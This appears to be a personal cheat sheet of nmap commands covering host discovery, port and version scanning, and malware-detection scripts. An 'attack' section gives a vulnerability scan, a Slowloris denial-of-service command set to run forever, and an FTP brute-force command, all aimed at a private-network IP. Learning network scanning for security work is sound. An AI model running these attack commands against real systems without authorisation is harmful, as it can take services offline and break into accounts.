nmap -T0 > T5 [+t > -t]

nmap -sV version detection
sudo nmap -n -PN -sT -sU -p- scanme.nmap.org
sudo nmap -sS scanme.nmap.org
sudo nmap -PN -p 80 -sV
nmap -v 192.168.0.101

sudo nmap -PN xxx.xxx.xxx.xxx-yyy
sudo nmap -sP xxx.xxx.xxx.xxx-yyy
nmap 192.168.0.*

nmap -iL nmaphostlist.txt
nmap -oN output.txt securitytrails.com

nmap -A -T4 cloudflare.com
nmap -sV localhost
nmap -sU localhost
nmap -sT localhost
nmap -sn 192.168.0.239
## attack
nmap -Pn --script vuln 192.168.1.105
[[DOS]] = nmap 192.168.1.105 -max-parallelism 800 -Pn --script http-slowloris --script-args http-slowloris.runforever=true
[[BFA]] = nmap nmap --script ftp-brute -p 21 192.168.1.105

## malware check
nmap -sV --script=http-malware-host 192.168.1.105
nmap -p80 --script http-google-malware infectedsite.com